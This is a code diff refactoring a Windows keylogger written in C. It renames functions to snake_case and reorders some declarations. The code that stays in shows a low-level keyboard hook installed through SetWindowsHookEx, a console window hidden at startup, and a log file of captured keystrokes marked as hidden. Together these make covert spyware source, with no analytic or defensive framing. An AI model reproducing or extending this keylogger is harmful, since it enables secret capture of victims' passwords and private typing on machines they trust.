@@ -1,6 +1,3 @@
-#include <stdio.h>
-#include <time.h>
-
 #include "keylogger.h"
 
 // Initialize empty hook
@@ -73,14 +70,14 @@ LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
     return CallNextHookEx(hook, nCode, wparam, lparam);
 }
 
-int setKeylogHook()
+int set_keylog_hook()
 {
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);
 
     return hook == NULL;
 }
 
-int removeKeylogHook()
+int remove_keylog_hook()
 {
     int unhook_status = UnhookWindowsHookEx(hook);
 
@@ -89,13 +86,13 @@ int removeKeylogHook()
     return unhook_status;
 }
 
-void hideLogFile()
+void hide_log_file()
 {
     DWORD attributes = GetFileAttributes("log");
     SetFileAttributes("log", attributes + FILE_ATTRIBUTE_HIDDEN);
 }
 
-void writeTimestampToLogFile()
+void write_timestamp_to_log_file()
 {
     FILE *f;
 
@@ -108,28 +105,28 @@ void writeTimestampToLogFile()
     fclose(f);
 }
 
-void initLogFile()
+void init_log_file()
 {
-    writeTimestampToLogFile();
-    hideLogFile();
+    write_timestamp_to_log_file();
+    hide_log_file();
 }
 
 int main()
 {
+    MSG msg;
+
     // Hides console window
     ShowWindow(GetConsoleWindow(), 0);
 
     // Initializes log file
-    initLogFile();
+    init_log_file();
 
     // Error handling for keylog hook creation
-    if (setKeylogHook() != 0)
+    if (set_keylog_hook() != 0)
     {
         fprintf(stderr, "Error setting keylog hook.\n\n");
         exit(EXIT_FAILURE);
     }
-
-    MSG msg;
 
     while (GetMessage(&msg, NULL, 0, 0))
     {
@@ -144,6 +141,6 @@ int main()
         exit(EXIT_FAILURE);
     }
 
-    return EXIT_SUCCESS;
+    exit(EXIT_SUCCESS);
 }
 
